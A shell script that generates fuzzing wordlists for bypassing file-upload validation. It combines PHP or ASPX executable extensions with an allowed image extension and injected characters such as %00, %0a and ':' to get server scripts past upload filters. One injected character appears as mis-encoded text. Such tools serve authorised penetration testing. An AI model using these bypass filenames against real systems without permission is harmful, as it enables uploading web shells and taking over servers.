#!/bin/sh
# Description: Generate php or aspx file upload wordlist, with and without character injection.
#              Useful for fuzzing whitelist/blacklist file upload validation (not magic byte)

generate_wordlist() {
    local exts="$1"
    local output_file="$2"
    local extensions="$3"

    echo "" > "$output_file"

    for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
        for real_ext in $exts; do
            for general_ext in $extensions; do
                echo "$real_ext.$general_ext" >> "$output_file"
                echo "$char$real_ext.$general_ext" >> "$output_file"
                echo "$real_ext$char.$general_ext" >> "$output_file"
                echo ".$general_ext$char$real_ext" >> "$output_file"
                echo ".$general_ext$real_ext$char" >> "$output_file"
            done
        done
    done
}

# Add more extensions here allowed by target file upload
default_extensions="jpg" # e.g. "pdf"

while [ $# -gt 0 ]; do
    case "$1" in
        --ext)
            ext_type="$2"
            shift 2
            ;;
        *)
            echo "Usage: $0 --ext {php|aspx}"
            exit 1
            ;;
    esac
done

if [ "$ext_type" = "php" ]; then
    generate_wordlist ".php .php3 .php4 .php5 .php7 .php8 .pht .phar .phpt .pgif .phtml .phtm" "php-file-upload-wordlist.txt" "$default_extensions"
elif [ "$ext_type" = "aspx" ]; then
    generate_wordlist ".aspx .ashx .asmx .asp" "aspx-file-upload-wordlist.txt" "$default_extensions"
else
    echo "Usage: $0 --ext {php|aspx}"
    exit 1
fi